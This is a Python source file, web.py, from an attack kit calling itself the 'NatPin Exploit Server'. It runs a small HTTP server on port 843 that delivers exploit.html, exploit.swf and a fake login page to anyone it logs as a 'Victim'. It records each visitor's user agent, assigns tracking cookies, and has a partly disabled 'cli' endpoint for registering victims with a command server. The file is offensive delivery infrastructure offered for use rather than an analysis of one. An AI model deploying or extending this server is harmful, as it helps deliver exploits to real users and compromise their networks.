#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time
import uuid
import base64

class HTTPProtoHandler(asyncore.dispatcher_with_send):
	REQPAGE = ""
	REQHEADER = ""
	REQHEADERDONE = 0
	def __init__(self,conn_sock, client_address, server):
		global REQHEADER
		global REQHEADERDONE
		REQHEADERDONE = 0
		REQHEADER = ""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort),3)
	def get_header(self,req,header_name,splitter=":"):
		headers=req.split("\n")
		result = ""
		for header in headers:
			headerparts = header.split(splitter)
			if len(headerparts)>1:
				if headerparts[0].strip().upper()==header_name.upper():
					result = header.strip()
		return result
	def handle_read(self):
		global REQPAGE, REQHEADER, REQHEADERDONE
		data = self.recv(1024)
		request = self.get_header(data,"GET", " ")
		cookie = self.get_header(data,"cookie", ":")
		if cookie == "":
			cookie = base64.urlsafe_b64encode(uuid.uuid4().bytes).replace("=","")
		else:
			cookie = cookie.split(" ")[1]
		_page = ""
		if request <>"":
			headerparts = request.split(" ")
			if headerparts[0]=="GET":
				_page = headerparts[1].replace("/","")
				if _page =="": _page = "exploit.html"
				self.server.log("Victim requested page: " + _page,3)
		_page=_page.lower()
		page = _page.split("?")[0];
		if page != "":
			arrPages = ["exploit.html","exploit.swf","gremwell_logo.png","login.html"]
			arrCommands = ["cli"]
			if page in arrPages:
				agent = self.get_header(data,"USER-AGENT",":")
				self.server.log("---" + agent,4)
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
				f = open("exploit/"+page,"r")
				body = f.read()
				f.close()		
			elif page in arrCommands:
				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: $len$\r\n\r\n"""
				body=""
				if page=="cli":
					if len(_page.split("?"))!=2:
						body ="Invalid command."
					else:
						cmdsrv = self.getCommandServer()
						if cmdsrv != None:
							command= _page.split("?")[1].strip().split("_")
							if command[0].upper()=="REG":
								body=""
								#DISABLED FOR NOW
								#self.server.log("Web REG request " + cookie, 2)
								#cmdsrv.createVictim(cookie,self.server.CALLER.getRemotePeer(self),"")
				else:
					body=""
			else:
				respheader="""HTTP/1.1 404 NOT FOUND\r\nServer: NatPin Exploit Server\r\nSet-Cookie: $cookie$\r\nContent-Length: 0\r\n\r\n"""
				body = ""
			respheader = respheader.replace("$len$",str(len(body)))
			respheader = respheader.replace("$cookie$",cookie)
			self.send(respheader+body)
			#self.send(body)
	def getCommandServer(self):
		result = None
		for server in self.server.CALLER.SERVERS:
			if server.TYPE=="Command Server":
				result = server
				break
		return result
#end class

class Server(Base):
	def __init__(self,serverPort=843, caller=None):
		self.TYPE = "Web Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",2)
	#end def
	def protocolhandler(self,conn, addr):
		# FLASH POLICY FILE SUPPORT
		self.HANDLER = HTTPProtoHandler(conn,addr,self)
	#end def
#end class
